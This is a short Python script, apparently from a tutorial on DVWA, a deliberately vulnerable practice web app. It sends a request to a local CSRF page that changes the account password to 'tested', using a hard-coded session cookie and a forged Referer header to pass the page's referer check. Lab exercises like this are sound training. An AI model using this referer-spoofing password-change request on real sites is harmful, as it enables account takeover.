#importing the library
import requests

#The url page we want to change the password ; step 4 in article
url = "http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=tested&password_conf=tested&Change=Change"

#Assign a variable to the specific page; get the cookie, and customize a referer
cookies = {"security": "medium", "PHPSESSID": "8kd0o34l5rju2ipsg8s0t7uesl"}
headers = {"Referer": "http://127.0.0.1/DVWA/vulnerabilities/csrf/"}

x = requests.get(url, cookies=cookies, headers=headers)
print(x.text)
